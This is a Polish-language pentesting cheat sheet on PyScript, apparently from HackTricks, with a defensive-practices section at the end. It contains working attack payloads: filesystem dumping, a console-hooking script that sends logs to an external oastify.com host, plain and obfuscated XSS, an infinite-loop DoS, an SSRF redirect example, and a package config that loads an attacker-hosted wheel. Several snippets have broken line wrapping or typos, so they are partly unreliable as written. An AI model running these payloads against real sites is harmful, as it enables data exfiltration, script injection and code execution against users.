# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Przewodnik po Pentestingu PyScript

PyScript to nowy framework opracowany do integracji Pythona z HTML, dzięki czemu może być używany obok HTML. W tym arkuszu skrótów znajdziesz, jak używać PyScript do celów testowania penetracyjnego.

### Zrzucanie / Pobieranie plików z wirtualnego systemu plików pamięci Emscripten:

`CVE ID: CVE-2022-30286`\
\
Kod:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Ekstrakcja danych z systemu plików pamięci wirtualnej Emscripten (monitorowanie konsoli)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Kod:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Zwykłe)

Kod:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kod:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (Obfuskacja JavaScript)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### Atak DoS (Nieskończona pętla)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nowe luki i techniki (2023-2025)

### Server-Side Request Forgery poprzez niekontrolowane przekierowania (CVE-2025-50182)

`urllib3 < 2.5.0` ignoruje parametry `redirect` i `retries`, gdy jest wykonywane **w czasie wykonywania Pyodide**, który jest dostarczany z PyScript. Gdy atakujący może wpływać na docelowe adresy URL, może zmusić kod Pythona do podążania za przekierowaniami międzydomenowymi, nawet gdy deweloper wyraźnie je wyłączył ‑ skutecznie omijając logikę anty-SSRF.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Załatane w `urllib3 2.5.0` – zaktualizuj pakiet w swoim obrazie PyScript lub przypisz bezpieczną wersję w `packages = ["urllib3>=2.5.0"]`. Zobacz oficjalny wpis CVE dla szczegółów.

### Ładowanie dowolnych pakietów i ataki na łańcuch dostaw

Ponieważ PyScript pozwala na dowolne adresy URL w liście `packages`, złośliwy aktor, który może modyfikować lub wstrzykiwać konfigurację, może wykonać **całkowicie dowolny kod Python** w przeglądarce ofiary:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Wymagane są tylko czyste koła Pythona – nie jest potrzebny krok kompilacji WebAssembly.* Upewnij się, że konfiguracja nie jest kontrolowana przez użytkownika i hostuj zaufane koła na swojej własnej domenie z HTTPS i haszami SRI.

### Zmiany w sanitizacji wyjścia (2023+)

* `print()` nadal wstrzykuje surowy HTML i jest zatem podatny na XSS (przykłady powyżej).
* Nowszy pomocnik `display()` **domyślnie ucieka HTML** – surowy znacznik musi być owinięty w `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
To zachowanie zostało wprowadzone w 2023 roku i jest udokumentowane w oficjalnym przewodniku po wbudowanych funkcjach. Polegaj na `display()` dla nieufnych danych wejściowych i unikaj bezpośredniego wywoływania `print()`.

---

## Najlepsze praktyki defensywne

* **Utrzymuj pakiety w aktualności** – zaktualizuj do `urllib3 >= 2.5.0` i regularnie odbudowuj koła dostarczane z witryną.
* **Ogranicz źródła pakietów** – odwołuj się tylko do nazw PyPI lub URL-i z tej samej domeny, najlepiej chronionych przez Sub-resource Integrity (SRI).
* **Wzmocnij politykę bezpieczeństwa treści** – zabroń inline JavaScript (`script-src 'self' 'sha256-…'`), aby wstrzyknięte bloki `<script>` nie mogły być wykonywane.
* **Zabroń dostarczanych przez użytkownika tagów `<py-script>` / `<script type="py">`** – oczyść HTML na serwerze przed zwróceniem go innym użytkownikom.
* **Izoluj pracowników** – jeśli nie potrzebujesz synchronicznego dostępu do DOM z pracowników, włącz flagę `sync_main_only`, aby uniknąć wymagań nagłówka `SharedArrayBuffer`.

## Odniesienia

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [Dokumentacja Built-ins PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
